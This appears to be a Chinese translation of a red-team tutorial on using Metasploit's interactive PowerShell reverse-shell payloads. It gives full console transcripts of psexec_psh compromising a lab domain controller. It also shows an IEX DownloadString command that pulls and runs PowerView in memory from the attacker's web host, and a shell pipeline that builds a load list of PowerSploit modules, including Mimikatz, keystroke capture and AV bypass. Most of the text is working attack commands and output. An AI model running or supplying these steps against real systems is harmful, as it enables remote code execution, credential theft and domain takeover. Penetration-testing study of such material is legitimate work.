> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bobao.360.cn](http://bobao.360.cn/learning/detail/488.html)

[![](http://p4.qhimg.com/t01a7d72d3fc1f217b3.png)](http://p4.qhimg.com/t01a7d72d3fc1f217b3.png)

以防任何人错过它，Metasploit 有多个新型 payload，它们允许交互式的 PowerShell 会话。这意味着什么？之前，如果你试图在 Meterpreter 中打开过 PowerShell 会话，那么在 PowerShell 和你的会话之间不能交互。

范例:

```
msf exploit(psexec_psh) > exploit 
[*] Started HTTPS reverse handler on https://0.0.0.0:444/
[*] 192.168.81.10:445 - Executing the payload...
[+] 192.168.81.10:445 - Service start timed out, OK if running a command or non-service executable...
[*] 192.168.81.10:49309 (UUID: 820e464723e817f9/x86=1/windows=1/2015-06-08T16:12:05Z) Staging Native payload ...
[*] Meterpreter session 23 opened (192.168.81.217:444 -> 192.168.81.10:49309) at 2015-06-08 12:12:05 -0400
 
meterpreter > shell
Process 2776 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
C:\Windows\system32>powershell
powershell
Windows PowerShell 
Copyright (C) 2009 Microsoft Corporation. All rights reserved.
Get-ExecutionPolicy
```

你所输入的任意命令将会在 ether 里消失。现在，由于 Ben Turner ([@benpturner](https://twitter.com/benpturner)) 和 Dave Hardy ([@davehardy20](https://twitter.com/davehardy20) 在 Nettitude 的努力工作，我们完全可以与 Powershell 会话交互 nteraction with PowerShell sessions! 这些模块的介绍可以在 [here](https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/) 找到.

为了在 Metasploit 内找到新型 payload, 简单搜索 "Interactive_Powershell".

```
msf payload(reverse_powershell) > search Interactive_Powershell
 
Matching Modules
================
 
   Name                                        Disclosure Date  Rank    Description
   ----                                        ---------------  ----    -----------
   payload/cmd/windows/powershell_bind_tcp                      normal  Windows Interactive Powershell Session, Bind TCP
   payload/cmd/windows/powershell_reverse_tcp                   normal  Windows Interactive Powershell Session, Reverse TCP
   payload/windows/powershell_bind_tcp                          normal  Windows Interactive Powershell Session, Bind TCP
   payload/windows/powershell_reverse_tcp                       normal  Windows Interactive Powershell Session, Reverse TCP
```

试试某一 “Reverse TCP” payload:

```
msf exploit(psexec_psh) > set payload windows/powershell_reverse_tcp
payload => windows/powershell_reverse_tcp
 
msf exploit(psexec_psh) > exploit 
 
[*] Started reverse handler on 192.168.81.217:444 
[*] 192.168.81.10:445 - Executing the payload...
[+] 192.168.81.10:445 - Service start timed out, OK if running a command or non-service executable...
[*] Powershell session session 24 opened (192.168.81.217:444 -> 192.168.81.10:49317) at 2015-06-08 12:15:42 -0400
 
Windows PowerShell running as user PWNT-DC$ on PWNT-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 
PS C:\Windows\system32>Get-ExecutionPolicy
Bypass
```

从某个 Meterpreter 的会话中可看出，这允许我们使用所有我们最喜欢的 PowerShell 工具，例如 PowerSploit 和 PowerTools(被包含在 Veil-Framework)。为了避免将工具下载到硬盘，我们使用 "[Invoke-Expression](https://technet.microsoft.com/en-us/library/hh849893.aspx)" 在内存中直接运行工具。

```
PS C:\Windows\system32>IEX(New-Object Net.WebClient).DownloadString("http://192.168.81.217/PowerTools/PowerView/powerview.ps1")
PS C:\Windows\system32> Get-NetGroup "Domain Admins" |select UserName
 
UserName                                                                       
--------                                                                       
TrustedSec                                                                     
Administrator
```

| 

除了从存在的会话内加载模块，在创建会话前，通过设置 "LOAD_MODULES" 参数，使用 payload 也可以让你配置模块  


 |

```
Payload options (windows/powershell_reverse_tcp):
 
   Name          Current Setting                                           Required  Description
   ----          ---------------                                           --------  -----------
   EXITFUNC      thread                                                    yes       Exit technique (accepted: seh, thread, process, none)
   LHOST         192.168.81.217                                            yes       The listen address
   LOAD_MODULES  http://192.168.81.217/PowerTools/PowerView/powerview.ps1  no        A list of powershell modules seperated by a comma to download over the web
   LPORT         444                                                       yes       The listen port
 
msf exploit(psexec_psh) > exploit 
 
[*] Loading 1 modules into the interactive PowerShell session
[*] Started reverse handler on 192.168.81.217:444 
[*] 192.168.81.10:445 - Executing the payload...
[+] 192.168.81.10:445 - Service start timed out, OK if running a command or non-service executable...
[*] Powershell session session 26 opened (192.168.81.217:444 -> 192.168.81.10:49391) at 2015-06-08 12:29:58 -0400
 
Windows PowerShell running as user PWNT-DC$ on PWNT-DC
Copyright (C) 2015 Microsoft Corporation. All rights reserved.
 
PS C:\Windows\system32> Get-NetForest
 
 
Name                  : pwnt.com
Sites                 : {Default-First-Site-Name}
Domains               : {pwnt.com}
GlobalCatalogs        : {pwnt-dc.pwnt.com}
ApplicationPartitions : {DC=DomainDnsZones,DC=pwnt,DC=com, DC=ForestDnsZones,DC
                        =pwnt,DC=com}
ForestMode            : Windows2008R2Forest
RootDomain            : pwnt.com
Schema                : CN=Schema,CN=Configuration,DC=pwnt,DC=com
SchemaRoleOwner       : pwnt-dc.pwnt.com
NamingRoleOwner       : pwnt-dc.pwnt.com
```

你也可以通过提供用逗号分割的列表来加载多个模块。我已经将 PowerSploit 和 PowerTools 模块克隆到我的 Apache root, 因此为了枚举所有模块，我可以简单使用 "find" 来递归地列出所有 PowerShell 脚本

```
root@kali:~# find /var/www -name "*.ps1"
/var/www/PowerSploit/CodeExecution/Invoke-ShellcodeMSIL.ps1
/var/www/PowerSploit/CodeExecution/Invoke-DllInjection.ps1
/var/www/PowerSploit/CodeExecution/Invoke-ReflectivePEInjection.ps1
/var/www/PowerSploit/CodeExecution/Invoke--Shellcode.ps1
/var/www/PowerSploit/CodeExecution/Invoke-Shellcode.ps1
/var/www/PowerSploit/Recon/Invoke-Portscan.ps1
/var/www/PowerSploit/Recon/Get-ComputerDetails.ps1
/var/www/PowerSploit/Recon/Invoke-ReverseDnsLookup.ps1
/var/www/PowerSploit/Recon/Get-HttpStatus.ps1
/var/www/PowerSploit/AntivirusBypass/Find-AVSignature.ps1
/var/www/PowerSploit/Exfiltration/Invoke-CredentialInjection.ps1
/var/www/PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1
/var/www/PowerSploit/Exfiltration/Invoke-NinjaCopy.ps1
/var/www/PowerSploit/Exfiltration/Out-Minidump.ps1
/var/www/PowerSploit/Exfiltration/Get-GPPPassword.ps1
/var/www/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1
/var/www/PowerSploit/Exfiltration/Get-VaultCredential.ps1
/var/www/PowerSploit/Exfiltration/Get-Keystrokes.ps1
/var/www/PowerSploit/Exfiltration/Get-TimedScreenshot.ps1
/var/www/PowerSploit/Exfiltration/VolumeShadowCopyTools.ps1
/var/www/PowerSploit/ScriptModification/Remove-Comments.ps1
/var/www/PowerSploit/ScriptModification/Out-EncodedCommand.ps1
/var/www/PowerSploit/ScriptModification/Out-CompressedDll.ps1
/var/www/PowerSploit/ScriptModification/Out-EncryptedScript.ps1
/var/www/PowerTools/PowerBreach/PowerBreach.ps1
/var/www/PowerTools/PewPewPew/Invoke-MassMimikatz.ps1
/var/www/PowerTools/PewPewPew/Invoke-MassTemplate.ps1
/var/www/PowerTools/PewPewPew/Invoke-MassSearch.ps1
/var/www/PowerTools/PewPewPew/Invoke-MassCommand.ps1
/var/www/PowerTools/PewPewPew/Invoke-MassTokens.ps1
/var/www/PowerTools/PowerPick/PSInjector/DLLEnc.ps1
/var/www/PowerTools/PowerPick/PSInjector/PSInject.ps1
/var/www/PowerTools/PowerUp/PowerUp.ps1
/var/www/PowerTools/PowerView/functions/Invoke-UserHunter.ps1
/var/www/PowerTools/PowerView/functions/Get-NetShare.ps1
/var/www/PowerTools/PowerView/functions/Invoke-ShareFinder.ps1
/var/www/PowerTools/PowerView/functions/Invoke-Netview.ps1
/var/www/PowerTools/PowerView/functions/Get-Net.ps1
/var/www/PowerTools/PowerView/functions/Get-NetSessions.ps1
/var/www/PowerTools/PowerView/functions/Get-NetLoggedon.ps1
/var/www/PowerTools/PowerView/powerview.ps1
```

使用 "sed" 命令用你的 web host 来替换 / var/www:

```
root@kali:~# find /var/www -name "*.ps1" |sed 's_/var/www_http://192.168.81.217_'
http://192.168.81.217/PowerSploit/CodeExecution/Invoke-ShellcodeMSIL.ps1
http://192.168.81.217/PowerSploit/CodeExecution/Invoke-DllInjection.ps1
http://192.168.81.217/PowerSploit/CodeExecution/Invoke-ReflectivePEInjection.ps1
http://192.168.81.217/PowerSploit/CodeExecution/Invoke--Shellcode.ps1
http://192.168.81.217/PowerSploit/CodeExecution/Invoke-Shellcode.ps1
http://192.168.81.217/PowerSploit/Recon/Invoke-Portscan.ps1
http://192.168.81.217/PowerSploit/Recon/Get-ComputerDetails.ps1
http://192.168.81.217/PowerSploit/Recon/Invoke-ReverseDnsLookup.ps1
http://192.168.81.217/PowerSploit/Recon/Get-HttpStatus.ps1
http://192.168.81.217/PowerSploit/AntivirusBypass/Find-AVSignature.ps1
http://192.168.81.217/PowerSploit/Exfiltration/Invoke-CredentialInjection.ps1
http://192.168.81.217/PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1
http://192.168.81.217/PowerSploit/Exfiltration/Invoke-NinjaCopy.ps1
http://192.168.81.217/PowerSploit/Exfiltration/Out-Minidump.ps1
http://192.168.81.217/PowerSploit/Exfiltration/Get-GPPPassword.ps1
http://192.168.81.217/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1
http://192.168.81.217/PowerSploit/Exfiltration/Get-VaultCredential.ps1
http://192.168.81.217/PowerSploit/Exfiltration/Get-Keystrokes.ps1
http://192.168.81.217/PowerSploit/Exfiltration/Get-TimedScreenshot.ps1
http://192.168.81.217/PowerSploit/Exfiltration/VolumeShadowCopyTools.ps1
http://192.168.81.217/PowerSploit/ScriptModification/Remove-Comments.ps1
http://192.168.81.217/PowerSploit/ScriptModification/Out-EncodedCommand.ps1
http://192.168.81.217/PowerSploit/ScriptModification/Out-CompressedDll.ps1
http://192.168.81.217/PowerSploit/ScriptModification/Out-EncryptedScript.ps1
http://192.168.81.217/PowerTools/PowerBreach/PowerBreach.ps1
http://192.168.81.217/PowerTools/PewPewPew/Invoke-MassMimikatz.ps1
http://192.168.81.217/PowerTools/PewPewPew/Invoke-MassTemplate.ps1
http://192.168.81.217/PowerTools/PewPewPew/Invoke-MassSearch.ps1
http://192.168.81.217/PowerTools/PewPewPew/Invoke-MassCommand.ps1
http://192.168.81.217/PowerTools/PewPewPew/Invoke-MassTokens.ps1
http://192.168.81.217/PowerTools/PowerPick/PSInjector/DLLEnc.ps1
http://192.168.81.217/PowerTools/PowerPick/PSInjector/PSInject.ps1
http://192.168.81.217/PowerTools/PowerUp/PowerUp.ps1
http://192.168.81.217/PowerTools/PowerView/functions/Invoke-UserHunter.ps1
http://192.168.81.217/PowerTools/PowerView/functions/Get-NetShare.ps1
http://192.168.81.217/PowerTools/PowerView/functions/Invoke-ShareFinder.ps1
http://192.168.81.217/PowerTools/PowerView/functions/Invoke-Netview.ps1
http://192.168.81.217/PowerTools/PowerView/functions/Get-Net.ps1
http://192.168.81.217/PowerTools/PowerView/functions/Get-NetSessions.ps1
http://192.168.81.217/PowerTools/PowerView/functions/Get-NetLoggedon.ps1
http://192.168.81.217/PowerTools/PowerView/powerview.ps1
```

创建某一通过逗号分割的表，使用 "tr":

```
root@kali:~# find /var/www -name "*.ps1" |sed 's_/var/www_http://192.168.81.217_'|sed 's_/var/www_https://192.168.81.217_' |tr '\n' ','
http://192.168.81.217/PowerSploit/CodeExecution/Invoke-ShellcodeMSIL.ps1,http://192.168.81.217/PowerSploit/CodeExecution/Invoke-DllInjection.ps1,http://192.168.81.217/PowerSploit/CodeExecution/Invoke-ReflectivePEInjection.ps1,http://192.168.81.217/PowerSploit/CodeExecution/Invoke--Shellcode.ps1,http://192.168.81.217/PowerSploit/CodeExecution/Invoke-Shellcode.ps1,http://192.168.81.217/PowerSploit/Recon/Invoke-Portscan.ps1,http://192.168.81.217/PowerSploit/Recon/Get-ComputerDetails.ps1,http://192.168.81.217/PowerSploit/Recon/Invoke-ReverseDnsLookup.ps1,http://192.168.81.217/PowerSploit/Recon/Get-HttpStatus.ps1,http://192.168.81.217/PowerSploit/AntivirusBypass/Find-AVSignature.ps1,http://192.168.81.217/PowerSploit/Exfiltration/Invoke-CredentialInjection.ps1,http://192.168.81.217/PowerSploit/Exfiltration/Invoke-TokenManipulation.ps1,http://192.168.81.217/PowerSploit/Exfiltration/Invoke-NinjaCopy.ps1,http://192.168.81.217/PowerSploit/Exfiltration/Out-Minidump.ps1,http://192.168.81.217/PowerSploit/Exfiltration/Get-GPPPassword.ps1,http://192.168.81.217/PowerSploit/Exfiltration/Invoke-Mimikatz.ps1,http://192.168.81.217/PowerSploit/Exfiltration/Get-VaultCredential.ps1,http://192.168.81.217/PowerSploit/Exfiltration/Get-Keystrokes.ps1,http://192.168.81.217/PowerSploit/Exfiltration/Get-TimedScreenshot.ps1,http://192.168.81.217/PowerSploit/Exfiltration/VolumeShadowCopyTools.ps1,http://192.168.81.217/PowerSploit/ScriptModification/Remove-Comments.ps1,http://192.168.81.217/PowerSploit/ScriptModification/Out-EncodedCommand.ps1,http://192.168.81.217/PowerSploit/ScriptModification/Out-CompressedDll.ps1,http://192.168.81.217/PowerSploit/ScriptModification/Out-EncryptedScript.ps1,http://192.168.81.217/PowerTools/PowerBreach/PowerBreach.ps1,http://192.168.81.217/PowerTools/PewPewPew/Invoke-MassMimikatz.ps1,http://192.168.81.217/PowerTools/PewPewPew/Invoke-MassTemplate.ps1,http://192.168.81.217/PowerTools/PewPewPew/Invoke-MassSearch.ps1,http://192.168.81.217/PowerTools/PewPewPew/Invoke-MassCommand.ps1,http://192.168.81.217/PowerTools/PewPewPew/Invoke-MassTokens.ps1,http://192.168.81.217/PowerTools/PowerPick/PSInjector/DLLEnc.ps1,http://192.168.81.217/PowerTools/PowerPick/PSInjector/PSInject.ps1,http://192.168.81.217/PowerTools/PowerUp/PowerUp.ps1,http://192.168.81.217/PowerTools/PowerView/functions/Invoke-UserHunter.ps1,http://192.168.81.217/PowerTools/PowerView/functions/Get-NetShare.ps1,http://192.168.81.217/PowerTools/PowerView/functions/Invoke-ShareFinder.ps1,http://192.168.81.217/PowerTools/PowerView/functions/Invoke-Netview.ps1,http://192.168.81.217/PowerTools/PowerView/functions/Get-Net.ps1,http://192.168.81.217/PowerTools/PowerView/functions/Get-NetSessions.ps1,http://192.168.81.217/PowerTools/PowerView/functions/Get-NetLoggedon.ps1,http://192.168.81.217/PowerTools/PowerView/powerview.ps1,
```

将输出复制 / 粘贴进你的 "LOAD_MODULES" 参数并且所有与 Powershell 相关的好东西尽在你的的 fingertips 里。

[![](http://bobao.360.cn/img/app.jpeg)](http://bobao.360.cn/img/app.jpeg) [![](http://bobao.360.cn/img/weixin.jpeg)](http://bobao.360.cn/img/weixin.jpeg)

本文由 安全客 翻译，转载请注明 “转自安全客”，并附上链接。  
[原文链接：https://www.trustedsec.com/june-2015/interactive-powershell-sessions-within-meterpreter/](https://www.trustedsec.com/june-2015/interactive-powershell-sessions-within-meterpreter/)